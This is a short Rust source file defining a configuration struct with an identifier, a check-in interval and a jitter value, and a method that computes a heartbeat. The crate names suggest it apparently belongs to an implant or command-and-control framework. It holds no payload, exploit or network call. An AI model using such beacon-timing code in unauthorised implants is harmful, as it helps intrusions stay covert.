use malefic_core::config::{INTERVAL, JITTER};

pub struct MetaConfig {
    uuid : [u8;4],
    pub interval : u64,
    pub jitter : f64,
}

impl MetaConfig {
    pub fn new(uuid: [u8;4]) -> Self {
        MetaConfig {
            uuid,
            interval: INTERVAL.clone(),
            jitter: JITTER.clone(),
        }
    }
    
    pub fn set_id(&mut self, uuid: [u8;4]) {
        self.uuid = uuid;
    }
    pub fn update(&mut self, interval: u64, jitter: f64) {
        self.interval = interval;
        self.jitter = jitter;
    }
    
    pub fn new_heartbeat(&self) -> u64 {
        malefic_proto::new_heartbeat(self.interval, self.jitter)
    }
    pub fn get_uuid(&self) -> [u8;4] {
        self.uuid
    }

}